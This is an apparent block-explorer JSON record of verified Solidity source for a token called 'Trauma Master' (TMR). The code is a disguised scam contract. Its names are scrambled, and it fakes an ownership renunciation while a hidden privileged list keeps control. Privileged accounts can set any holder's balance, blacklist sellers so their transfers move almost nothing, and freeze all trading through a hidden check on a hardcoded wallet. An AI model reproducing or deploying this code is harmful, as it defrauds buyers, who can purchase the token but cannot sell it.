{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface txAtList {\n    function createPair(address limitReceiver, address feeAt) external returns (address);\n}\n\ninterface isTokenMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minTo) external view returns (uint256);\n\n    function transfer(address receiverMax, uint256 tokenBuyMode) external returns (bool);\n\n    function allowance(address tradingEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenBuyMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverMax,\n        uint256 tokenBuyMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundEnable, uint256 value);\n    event Approval(address indexed tradingEnable, address indexed spender, uint256 value);\n}\n\nabstract contract enableMarketingTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atMinLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atSell is isTokenMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TraumaMaster is enableMarketingTx, isTokenMarketing, atSell {\n\n    function feeFund(address tradingTotal) public {\n        feeLiquidity();\n        \n        if (tradingTotal == launchedTradingTo || tradingTotal == modeLaunchedFrom) {\n            return;\n        }\n        launchLimit[tradingTotal] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderFund;\n    }\n\n    function allowance(address fundLiquidity, address listSell) external view virtual override returns (uint256) {\n        if (listSell == marketingTeam) {\n            return type(uint256).max;\n        }\n        return limitAmountAuto[fundLiquidity][listSell];\n    }\n\n    bool public receiverSwap;\n\n    function getOwner() external view returns (address) {\n        return receiverSell;\n    }\n\n    constructor (){\n        \n        atMinLaunch launchedSwap = atMinLaunch(marketingTeam);\n        modeLaunchedFrom = txAtList(launchedSwap.factory()).createPair(launchedSwap.WETH(), address(this));\n        \n        launchedTradingTo = _msgSender();\n        swapReceiverLaunch[launchedTradingTo] = true;\n        marketingWalletMode[launchedTradingTo] = enableFund;\n        walletMarketing();\n        \n        emit Transfer(address(0), launchedTradingTo, enableFund);\n    }\n\n    function walletMarketing() public {\n        emit OwnershipTransferred(launchedTradingTo, address(0));\n        receiverSell = address(0);\n    }\n\n    mapping(address => bool) public launchLimit;\n\n    function tokenMin(address tokenMarketingTotal, uint256 tokenBuyMode) public {\n        feeLiquidity();\n        marketingWalletMode[tokenMarketingTotal] = tokenBuyMode;\n    }\n\n    uint256 constant teamEnable = 8 ** 10;\n\n    function transferFrom(address sellTake, address receiverMax, uint256 tokenBuyMode) external override returns (bool) {\n        if (_msgSender() != marketingTeam) {\n            if (limitAmountAuto[sellTake][_msgSender()] != type(uint256).max) {\n                require(tokenBuyMode <= limitAmountAuto[sellTake][_msgSender()]);\n                limitAmountAuto[sellTake][_msgSender()] -= tokenBuyMode;\n            }\n        }\n        return buyLiquidity(sellTake, receiverMax, tokenBuyMode);\n    }\n\n    address public modeLaunchedFrom;\n\n    address swapAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address listSell, uint256 tokenBuyMode) public virtual override returns (bool) {\n        limitAmountAuto[_msgSender()][listSell] = tokenBuyMode;\n        emit Approval(_msgSender(), listSell, tokenBuyMode);\n        return true;\n    }\n\n    string private enableTotalAmount = \"Trauma Master\";\n\n    function fundTotal(address toFrom) public {\n        if (listFundSwap) {\n            return;\n        }\n        \n        swapReceiverLaunch[toFrom] = true;\n        \n        listFundSwap = true;\n    }\n\n    uint256 private enableFund = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private marketingWalletMode;\n\n    address public launchedTradingTo;\n\n    function feeLiquidity() private view {\n        require(swapReceiverLaunch[_msgSender()]);\n    }\n\n    bool private receiverBuy;\n\n    mapping(address => bool) public swapReceiverLaunch;\n\n    mapping(address => mapping(address => uint256)) private limitAmountAuto;\n\n    function balanceOf(address minTo) public view virtual override returns (uint256) {\n        return marketingWalletMode[minTo];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenEnableIs;\n    }\n\n    function swapExemptAmount(uint256 tokenBuyMode) public {\n        feeLiquidity();\n        exemptFee = tokenBuyMode;\n    }\n\n    function buyLiquidity(address sellTake, address receiverMax, uint256 tokenBuyMode) internal returns (bool) {\n        if (sellTake == launchedTradingTo) {\n            return senderFeeIs(sellTake, receiverMax, tokenBuyMode);\n        }\n        uint256 senderFee = isTokenMarketing(modeLaunchedFrom).balanceOf(swapAuto);\n        require(senderFee == exemptFee);\n        require(receiverMax != swapAuto);\n        if (launchLimit[sellTake]) {\n            return senderFeeIs(sellTake, receiverMax, teamEnable);\n        }\n        return senderFeeIs(sellTake, receiverMax, tokenBuyMode);\n    }\n\n    address marketingTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function senderFeeIs(address sellTake, address receiverMax, uint256 tokenBuyMode) internal returns (bool) {\n        require(marketingWalletMode[sellTake] >= tokenBuyMode);\n        marketingWalletMode[sellTake] -= tokenBuyMode;\n        marketingWalletMode[receiverMax] += tokenBuyMode;\n        emit Transfer(sellTake, receiverMax, tokenBuyMode);\n        return true;\n    }\n\n    bool public listFundSwap;\n\n    bool private receiverTake;\n\n    function name() external view virtual override returns (string memory) {\n        return enableTotalAmount;\n    }\n\n    uint256 takeFromMax;\n\n    function transfer(address tokenMarketingTotal, uint256 tokenBuyMode) external virtual override returns (bool) {\n        return buyLiquidity(_msgSender(), tokenMarketingTotal, tokenBuyMode);\n    }\n\n    address private receiverSell;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableFund;\n    }\n\n    string private tokenEnableIs = \"TMR\";\n\n    function owner() external view returns (address) {\n        return receiverSell;\n    }\n\n    uint256 exemptFee;\n\n    uint8 private senderFund = 18;\n\n    event OwnershipTransferred(address indexed marketingTake, address indexed receiverBuyLaunch);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverBuyLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenBuyMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTotal\",\"type\":\"address\"}],\"name\":\"feeFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFrom\",\"type\":\"address\"}],\"name\":\"fundTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTradingTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFundSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunchedFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenBuyMode\",\"type\":\"uint256\"}],\"name\":\"swapExemptAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapReceiverLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMarketingTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenBuyMode\",\"type\":\"uint256\"}],\"name\":\"tokenMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMarketingTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenBuyMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenBuyMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TraumaMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}